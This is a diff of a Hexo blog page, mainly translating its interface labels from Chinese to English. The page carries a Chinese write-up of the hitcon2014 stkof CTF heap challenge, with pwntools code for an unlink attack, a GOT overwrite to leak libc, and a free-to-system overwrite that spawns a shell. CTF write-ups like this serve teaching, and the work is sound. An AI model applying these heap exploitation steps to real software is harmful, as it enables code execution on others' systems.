@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="zh-CN">
+<html lang="zh-CH">
 <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
@@ -22,9 +22,9 @@
 <meta property="og:type" content="article">
 <meta property="og:title" content="hitcon2014_stkof-unlink">
 <meta property="og:url" content="http://downbeat.top/2024/09/03/hitcon2014-stkof-unlink/index.html">
-<meta property="og:site_name" content="Dream Of All Stack">
+<meta property="og:site_name" content="D0wnBe@t">
 <meta property="og:description" content="unlink–只有add,free,edit题目链接  知识点unlink修改free_got，利用puts_got,puts_plt 文章链接  题目速览经典堆菜单 add： 注意先加一，才记录地址   delete： edit： 漏洞点，未对size检查   思路分析 本题目没有后门函数，所以需要我们泄露libc 开启了PIE,且只有free,add,edit函数可以使用，正常的uaf通过un">
-<meta property="og:locale" content="zh_CN">
+<meta property="og:locale" content="zh_CH">
 <meta property="og:image" content="http://downbeat.top/hitcon2014-stkof-unlink/capture_20240903211652894.bmp">
 <meta property="og:image" content="http://downbeat.top/hitcon2014-stkof-unlink/capture_20240903211718246.bmp">
 <meta property="og:image" content="http://downbeat.top/hitcon2014-stkof-unlink/capture_20240903211711681.bmp">
@@ -87,9 +87,9 @@
     
 
     <script id="hexo-configurations">
-    window.config = {"hostname":"downbeat.top","root":"/","language":"zh-CN","path":"search.xml"};
+    window.config = {"hostname":"downbeat.top","root":"/","language":"zh-CH","path":"search.xml"};
     window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Theme Redefine","subtitle":{"text":[],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.7.3","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2022/8/17 11:45:14"};
-    window.lang_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
     window.data = {"masonry":false};
   </script>
     
@@ -160,7 +160,7 @@
                                    href="/"
                                         >
                                     <i class="fa-regular fa-house fa-fw"></i>
-                                    首页
+                                    HOME
                                     
                                 </a>
 
@@ -194,7 +194,7 @@
                            href="/"
                         >
                             <span>
-                                首页
+                                HOME
                             </span>
                             
                                 <i class="fa-regular fa-house fa-sm fa-fw"></i>
@@ -213,15 +213,15 @@
         <div class="statistics flex justify-around my-2.5">
     <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
         <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">9</div>
-        <div class="label text-third-text-color text-sm">标签</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
     </a>
     <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
         <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">0</div>
-        <div class="label text-third-text-color text-sm">分类</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
     </a>
     <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
         <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">32</div>
-        <div class="label text-third-text-color text-sm">文章</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
     </a>
 </div>
     </div>
@@ -269,14 +269,14 @@
         <i class="fa-regular fa-pen-fancy"></i>&nbsp;
         <span class="desktop">2024-09-03 21:14:27</span>
         <span class="mobile">2024-09-03 21:14:27</span>
-        <span class="hover-info">创建</span>
+        <span class="hover-info">Created</span>
     </span>
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
             <span class="desktop">2024-09-05 10:08:44</span>
             <span class="mobile">2024-09-05 10:08:44</span>
-            <span class="hover-info">更新</span>
+            <span class="hover-info">Updated</span>
         </span>
     
 
@@ -297,12 +297,12 @@
     
     
         <span class="article-wordcount article-meta-item">
-            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>591 字</span>
+            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>591 Words</span>
         </span>
     
     
         <span class="article-min2read article-meta-item">
-            <i class="fa-regular fa-clock"></i>&nbsp;<span>2 分钟</span>
+            <i class="fa-regular fa-clock"></i>&nbsp;<span>2 Mins</span>
         </span>
     
     
@@ -340,16 +340,16 @@
 <li>但是我们还有一个unlink，以前都是修改free_got为sysem，现在我们可以将free_got修改为puts_plt，然后调用free就相当于puts_plt，将puts_got写入chunk中，就可以得到libc地址了。</li>
 <li>然后就是正常的修改free_got为system_plt，写入&#x2F;bin&#x2F;sh，然后free就getshell了</li>
 </ul>
-<h2 id="gdb调试"><a href="#gdb调试" class="headerlink" title="gdb调试"></a>gdb调试</h2><h4 id="1-实现unlink"><a href="#1-实现unlink" class="headerlink" title="1.实现unlink"></a>1.实现unlink</h4><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">s = <span class="number">0x0602140</span></span><br><span class="line">bss = s + <span class="number">0x10</span></span><br><span class="line">add(<span class="number">0x20</span>) <span class="comment"># 1 s+8</span></span><br><span class="line">add(<span class="number">0x30</span>) <span class="comment"># 2 s+0x10</span></span><br><span class="line">add(<span class="number">0x80</span>) <span class="comment"># 3</span></span><br><span class="line">add(<span class="number">0x20</span>) <span class="comment"># 4</span></span><br><span class="line"></span><br><span class="line">fd = bss - <span class="number">0x18</span></span><br><span class="line">bk = bss - <span class="number">0x10</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x30</span>) + p64(fd)+p64(bk)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0x30</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">free(<span class="number">3</span>) <span class="comment"># 2,3合并,触发unlink</span></span><br></pre></td></tr></table></figure></div>
+<h2 id="gdb调试"><a href="#gdb调试" class="headerlink" title="gdb调试"></a>gdb调试</h2><h4 id="1-实现unlink"><a href="#1-实现unlink" class="headerlink" title="1.实现unlink"></a>1.实现unlink</h4><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="number">0x0602140</span></span><br><span class="line">bss = s + <span class="number">0x10</span></span><br><span class="line">add(<span class="number">0x20</span>) <span class="comment"># 1 s+8</span></span><br><span class="line">add(<span class="number">0x30</span>) <span class="comment"># 2 s+0x10</span></span><br><span class="line">add(<span class="number">0x80</span>) <span class="comment"># 3</span></span><br><span class="line">add(<span class="number">0x20</span>) <span class="comment"># 4</span></span><br><span class="line"></span><br><span class="line">fd = bss - <span class="number">0x18</span></span><br><span class="line">bk = bss - <span class="number">0x10</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x30</span>) + p64(fd)+p64(bk)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0x30</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">free(<span class="number">3</span>) <span class="comment"># 2,3合并,触发unlink</span></span><br></pre></td></tr></table></figure></div>
 
 <ul>
 <li>bss中0x0602140是add函数中s的地址，也是存储chunk的地址，但是之前也说了，我们是先+1再储存chunk地址的，因此chunk1对应于s[1],也就是0x0602140+0x8</li>
 <li>unlink可以使当前储存chunk的地址指向target_addr-0x18，这样改的话会出现下面情况：</li>
 </ul>
-<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">s[<span class="number">2</span>]- <span class="number">0x18</span></span><br><span class="line">s[<span class="number">0</span>] -&gt; <span class="number">0x0</span></span><br><span class="line">s[<span class="number">1</span>] -&gt; chunk1_user_data</span><br><span class="line">s[<span class="number">2</span>] -&gt; s[<span class="number">2</span>]<span class="number">-0x18</span> </span><br></pre></td></tr></table></figure></div>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">s[<span class="number">2</span>]- <span class="number">0x18</span></span><br><span class="line">s[<span class="number">0</span>] -&gt; <span class="number">0x0</span></span><br><span class="line">s[<span class="number">1</span>] -&gt; chunk1_user_data</span><br><span class="line">s[<span class="number">2</span>] -&gt; s[<span class="number">2</span>]<span class="number">-0x18</span> </span><br></pre></td></tr></table></figure></div>
 
 <p><img lazyload src="/images/loading.svg" data-src="/hitcon2014-stkof-unlink/capture_20240903214034468.bmp"></p>
-<h4 id="2-修改free-got为puts-plt，泄露libc"><a href="#2-修改free-got为puts-plt，泄露libc" class="headerlink" title="2.修改free_got为puts_plt，泄露libc"></a>2.修改free_got为puts_plt，泄露libc</h4><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">payload = flat( [ cyclic(<span class="number">0x10</span>), free_got, puts_got] )</span><br><span class="line">edit(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x8</span>,p64(puts_plt))</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&quot;puts_address: &quot;</span>+<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system = base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br></pre></td></tr></table></figure></div>
+<h4 id="2-修改free-got为puts-plt，泄露libc"><a href="#2-修改free-got为puts-plt，泄露libc" class="headerlink" title="2.修改free_got为puts_plt，泄露libc"></a>2.修改free_got为puts_plt，泄露libc</h4><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">payload = flat( [ cyclic(<span class="number">0x10</span>), free_got, puts_got] )</span><br><span class="line">edit(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x8</span>,p64(puts_plt))</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&quot;puts_address: &quot;</span>+<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system = base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br></pre></td></tr></table></figure></div>
 
 <ul>
 <li><font size="4"><strong>第一个payload:</strong></font></li>
@@ -362,7 +362,7 @@
 <p><font size="4" color="red">这里一定要记住got@plt会自动的指向plt表，也就是说，修改got表到A-B这样的地址结构的时候，会形成A-&gt;GOT@plt-&gt;plt，这样三地址结构，所以我们再次修改A地址为plt才会成功。</font></p>
 <p><img lazyload src="/images/loading.svg" data-src="/hitcon2014-stkof-unlink/capture_20240903215051485.bmp"></p>
 <p>成功修改，然后free(2)，2处存储的是puts_plt的地址。</p>
-<h4 id="3-修改free-got为system-然后getshell"><a href="#3-修改free-got为system-然后getshell" class="headerlink" title="3.修改free_got为system,然后getshell"></a>3.修改free_got为system,然后getshell</h4><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">edit(<span class="number">1</span>,<span class="number">0x8</span>,p64(system))</span><br><span class="line">edit(<span class="number">4</span>,<span class="number">0x8</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
+<h4 id="3-修改free-got为system-然后getshell"><a href="#3-修改free-got为system-然后getshell" class="headerlink" title="3.修改free_got为system,然后getshell"></a>3.修改free_got为system,然后getshell</h4><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">1</span>,<span class="number">0x8</span>,p64(system))</span><br><span class="line">edit(<span class="number">4</span>,<span class="number">0x8</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
 
 <ul>
 <li>没什么说的，和之前一样的。</li>
@@ -375,27 +375,27 @@
             <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
                 <div class="article-copyright-info-container">
     <ul>
-        <li><strong>标题:</strong> hitcon2014_stkof-unlink</li>
-        <li><strong>作者:</strong> The Redefine Team</li>
-        <li><strong>创建于
+        <li><strong>Title:</strong> hitcon2014_stkof-unlink</li>
+        <li><strong>Author:</strong> The Redefine Team</li>
+        <li><strong>Created at
                 :</strong> 2024-09-03 21:14:27</li>
         
             <li>
-                <strong>更新于
+                <strong>Updated at
                     :</strong> 2024-09-05 10:08:44
             </li>
         
         <li>
-            <strong>链接:</strong> https://redefine.ohevan.com/2024/09/03/hitcon2014-stkof-unlink/
+            <strong>Link:</strong> https://redefine.ohevan.com/2024/09/03/hitcon2014-stkof-unlink/
         </li>
         <li>
             <strong>
-                版权声明:
+                License:
             </strong>
             
 
             
-                本文章采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a> 进行许可。
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
             
         </li>
     </ul>
@@ -429,7 +429,7 @@
                             </span>
                             <span class="title flex justify-center items-center">
                                 <span class="post-nav-title-item">记第一次awd测试</span>
-                                <span class="post-nav-item">上一篇</span>
+                                <span class="post-nav-item">Prev posts</span>
                             </span>
                         </a>
                     </div>
@@ -442,7 +442,7 @@
                         >
                             <span class="title flex justify-center items-center">
                                 <span class="post-nav-title-item">0ctf_2017_babyheap--fastbin_attack</span>
-                                <span class="post-nav-item">下一篇</span>
+                                <span class="post-nav-item">Next posts</span>
                             </span>
                             <span class="right arrow-icon flex justify-center items-center">
                                 <i class="fa-solid fa-chevron-right"></i>
@@ -459,7 +459,7 @@
                 <div class="comments-container mt-10 w-full ">
     <div id="comment-anchor" class="w-full h-2.5"></div>
     <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
-        评论
+        Comments
     </div>
     
 
@@ -504,7 +504,7 @@
         <div class="toc-content-container">
             <div class="post-toc-wrap">
     <div class="post-toc">
-        <div class="toc-title">目录</div>
+        <div class="toc-title">On this page</div>
         <div class="page-title">hitcon2014_stkof-unlink</div>
         <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#unlink%E2%80%93%E5%8F%AA%E6%9C%89add-free-edit"><span class="nav-text">unlink–只有add,free,edit</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="nav-text">知识点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E9%80%9F%E8%A7%88"><span class="nav-text">题目速览</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF%E5%88%86%E6%9E%90"><span class="nav-text">思路分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#gdb%E8%B0%83%E8%AF%95"><span class="nav-text">gdb调试</span></a></li></ol></li></ol>
 
@@ -539,11 +539,11 @@
                 
                 <p class="post-count space-x-0.5">
                     <span>
-                        共撰写了 32 篇文章
+                        32 posts in total
                     </span>
                     
                         <span>
-                            共 32.8k 字
+                            32.9k words in total
                         </span>
                     
                 </p>
@@ -554,26 +554,26 @@
             <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
                 
                     <span id="busuanzi_container_site_uv" class="lg:!block">
-                        <span class="text-sm">访问人数</span>
+                        <span class="text-sm">VISITOR COUNT</span>
                         <span id="busuanzi_value_site_uv"></span>
                     </span>
                 
                 
                     <span id="busuanzi_container_site_pv" class="lg:!block">
-                        <span class="text-sm">总访问量</span>
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
                         <span id="busuanzi_value_site_pv"></span>
                     </span>
                 
             </div>
         
         <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
-            <span class="lg:block text-sm">由 <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a> 驱动</span>
-            <span class="text-sm lg:block">主题&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.7.3</a></span>
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.7.3</a></span>
         </div>
         
         
             <div>
-                博客已运行 <span class="odometer" id="runtime_days" ></span> 天 <span class="odometer" id="runtime_hours"></span> 小时 <span class="odometer" id="runtime_minutes"></span> 分钟 <span class="odometer" id="runtime_seconds"></span> 秒
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
             </div>
         
         
